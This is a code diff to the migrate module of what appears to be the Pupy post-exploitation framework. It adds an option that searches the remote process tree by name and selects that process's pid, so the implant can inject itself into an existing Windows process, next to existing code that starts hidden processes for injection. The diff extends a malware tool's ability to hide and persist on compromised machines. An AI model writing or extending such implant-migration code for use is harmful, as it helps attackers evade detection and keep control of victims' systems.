@@ -26,6 +26,8 @@ class MigrateModule(PupyModule):
         group = cls.arg_parser.add_mutually_exclusive_group(required=True)
         group.add_argument('-c', '--create', metavar='<exe_path>',
                             help='create a new process and inject into it')
+        group.add_argument('-p', '--process', metavar='process_name',
+                            help='search a process name and migrate into')
         group.add_argument('pid', nargs='?', type=int, help='pid')
         cls.arg_parser.add_argument(
             '-k', '--keep', action='store_true',
@@ -54,6 +56,18 @@ class MigrateModule(PupyModule):
                 p=self.client.conn.modules['pupwinutils.processes'].start_hidden_process(args.create)
                 pid=p.pid
                 self.success("%s created with pid %s"%(args.create,pid))
+            elif args.process:
+                self.success("Looking for process %s"%args.process)
+                pstree = self.client.remote('pupyps', 'pstree')
+                root, tree, data = pstree()
+                for k,v in data.iteritems():
+                    proc=v['exe']
+                    if not proc:
+                        continue
+                    if args.process.lower() in proc.lower():
+                        pid=int(k)
+                        self.success("Migrating to existing windows process {} identified with the pid {}".format(proc, pid))
+                        break
             else:
                 self.success("Migrating to existing windows process identified with the pid {0}".format(args.pid))
                 pid=args.pid
